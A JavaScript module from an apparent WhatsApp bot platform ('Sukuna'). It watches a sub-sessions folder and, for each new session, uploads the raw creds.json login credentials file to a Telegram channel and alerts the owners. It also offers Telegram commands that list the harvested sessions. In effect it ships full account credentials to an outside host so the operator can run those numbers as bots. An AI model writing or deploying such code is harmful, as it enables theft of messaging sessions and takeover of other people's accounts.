/**
 * ═══════════════════════════════════════════════════════
 * 📡 TELEGRAM SESSION MONITOR | مراقب الجلسات الذكي
 * ═══════════════════════════════════════════════════════
 * 👑 المطور: آدم (شادو) | Adam (Shadow)
 * 🤖 البوت: سوكونا | Sukuna
 * 📜 الوصف: مراقبة جلسات جديدة وإرسالها لقناة التليجرام
 * ═══════════════════════════════════════════════════════
 */

import { Telegraf } from 'telegraf'
import fs from 'fs'
import path from 'path'
import config from './config.js'

let bot = null
const processedSessions = new Set()

export async function notifyNewSession(botNumber, sessionPath) {
  if (!bot || !config.telegram.token) {
    console.log('[MONITOR] ⚠️ Telegram not configured')
    return
  }

  try {
    const credsPath = path.join(sessionPath, 'creds.json')
    if (!fs.existsSync(credsPath)) return

    const files = fs.readdirSync(sessionPath)
    const now = new Date().toLocaleString('ar-SA')

    const message = [
      '╔═══════════════════════════╗',
      '║   🕸 *جلسة جديدة جاهزة* 🕸   ║',
      '╚═══════════════════════════╝',
      '',
      `📱 *الرقم:* \`${botNumber}\``,
      `📂 *الملفات:* ${files.length}`,
      `🕐 *الوقت:* ${now}`,
      '',
      '⊱⊹•─๋︩︪═╾═─•┈⧽┊🎭┊⧼┈•─═╼═─๋︩︪•⊹⊰',
      '',
      'الجلسة جاهزة للتشغيل كـ Sub Bot',
      'استخدم `*تشغيل_الفرعيات*` في البوت الرئيسي'
    ].join('\n')

    if (config.telegram.sessionsChannel) {
      await bot.telegram.sendMessage(
        config.telegram.sessionsChannel,
        message,
        { parse_mode: 'Markdown' }
      )

      const credsBuffer = fs.readFileSync(credsPath)
      await bot.telegram.sendDocument(
        config.telegram.sessionsChannel,
        { source: credsBuffer },
        {
          caption: `📦 جلسة: ${botNumber}`,
          filename: `creds_${botNumber}.json`
        }
      )

      console.log(`[MONITOR] 📡 Sent: ${botNumber}`)
    }

    for (const ownerId of config.telegram.owners) {
      try {
        await bot.telegram.sendMessage(
          ownerId,
          `✅ *جلسة جديدة!*\n\n📱 \`${botNumber}\``,
          { parse_mode: 'Markdown' }
        )
      } catch {}
    }
  } catch (e) {
    console.error('[MONITOR] ❌ Error:', e.message)
  }
}

function startWatching() {
  const subDir = config.subSessionsDir
  if (!fs.existsSync(subDir)) fs.mkdirSync(subDir, { recursive: true })

  console.log(`[MONITOR] 👁️ Watching: ${subDir}`)

  setInterval(async () => {
    try {
      const sessions = fs.readdirSync(subDir)
      for (const session of sessions) {
        const sessionPath = path.join(subDir, session)
        const credsPath = path.join(sessionPath, 'creds.json')

        if (fs.existsSync(credsPath) && !processedSessions.has(session)) {
          processedSessions.add(session)
          console.log(`[MONITOR] 🆕 New: ${session}`)
          await notifyNewSession(session, sessionPath)
        }
      }
    } catch (e) {
      console.error('[MONITOR] Watch error:', e.message)
    }
  }, config.telegram.checkInterval)
}

export async function startTelegramMonitor() {
  if (!config.telegram.token) {
    console.log('[MONITOR] ⚠️ Telegram not set. Monitor disabled.')
    return
  }

  try {
    bot = new Telegraf(config.telegram.token)
    globalThis.sessionMonitorBot = bot

    bot.command('status', async (ctx) => {
      const subDir = config.subSessionsDir
      let count = 0
      try {
        count = fs.readdirSync(subDir).filter(s =>
          fs.existsSync(path.join(subDir, s, 'creds.json'))
        ).length
      } catch {}

      await ctx.reply(
        [
          '🕸 *حالة منصة سوكونا*',
          '',
          `📂 الجلسات: \`${count}\``,
          `📡 المراقبة: ✅ شغالة`,
          `⏱️ ${new Date().toLocaleTimeString('ar-SA')}`
        ].join('\n'),
        { parse_mode: 'Markdown' }
      )
    })

    bot.command('sessions', async (ctx) => {
      const subDir = config.subSessionsDir
      let sessions = []
      try {
        sessions = fs.readdirSync(subDir).filter(s =>
          fs.existsSync(path.join(subDir, s, 'creds.json'))
        )
      } catch {}

      if (!sessions.length) {
        return ctx.reply('📭 لا توجد جلسات حالياً.')
      }

      const list = sessions.map((s, i) => `${i + 1}. 📱 \`${s}\``).join('\n')
      await ctx.reply(
        [
          '🕸 *الجلسات المتاحة:*',
          '',
          list,
          '',
          `📊 الإجمالي: ${sessions.length}`
        ].join('\n'),
        { parse_mode: 'Markdown' }
      )
    })

    await bot.launch()
    console.log('[MONITOR] ✅ Telegram monitor running!')
    startWatching()
  } catch (e) {
    console.error('[MONITOR] ❌ Start error:', e.message)
  }
}

export default { startTelegramMonitor, notifyNewSession }